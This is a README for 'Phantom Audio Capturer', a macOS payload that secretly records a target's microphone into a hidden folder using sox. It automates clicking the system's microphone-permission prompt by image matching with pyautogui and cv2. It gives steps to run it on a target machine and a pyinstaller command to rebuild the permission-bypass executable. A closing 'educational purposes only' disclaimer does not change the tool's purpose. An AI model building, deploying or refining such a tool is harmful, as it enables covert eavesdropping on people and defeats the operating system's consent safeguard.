# Phantom Audio Capturer

## Description
Phantom Audio Capturer is a macOS payload developed by Narsty and updated by YonKu0 to allow automatic mic permission. It discreetly records audio through the microphone and saves it as an MP3 file in a hidden folder. The script uses `sox` for recording and automates microphone permission with `pyautogui` and `cv2`. 

## Features
- Creates a hidden folder `.phantom_audio` for recordings.
- Automated mic permission handling.
- Continuous audio recording until stopped manually.
- Easy retrieval of the recorded audio file.

## Requirements
- MacOS
- `sox` (Install via Homebrew: `brew install sox`)

## Usage
1. Execute the script on the target MacOS device.
2. The script automatically starts recording audio in the background.
3. To access the recordings, navigate to `~/.phantom_audio`.

## Stopping the Recording
1. Find the PID of the `sox` process.
2. Execute `kill pid#` or `killall -9 sox` to stop the recording process.

## Cleaning Up
- Delete the `.phantom_audio` folder with `rm -r ~/.phantom_audio`.

## Python Script
- The script includes a Python component that automates microphone permission handling.
- For re-compilation: Download Voice Logger directory and run:
 `pyinstaller --onefile --add-data "allow_button_images/allow_button_image.jpg:allow_button_images" --add-data "allow_button_images/allow_button_image1.jpg:allow_button_images" --add-data "allow_button_images/allow_button_image2.jpg:allow_button_images" --add-data "allow_button_images/allow_button_image3.jpg:allow_button_images" --add-data "allow_button_images/allow_button_image4.jpg:allow_button_images" --add-data "allow_button_images/allow_button_image5.jpg:allow_button_images" allow_permission_mac.py`
- The executable file will inside the dist directory

## Disclaimer
- For educational purposes only.
- Not intended for malicious use.
- The author is not responsible for misuse or damage caused by this script.
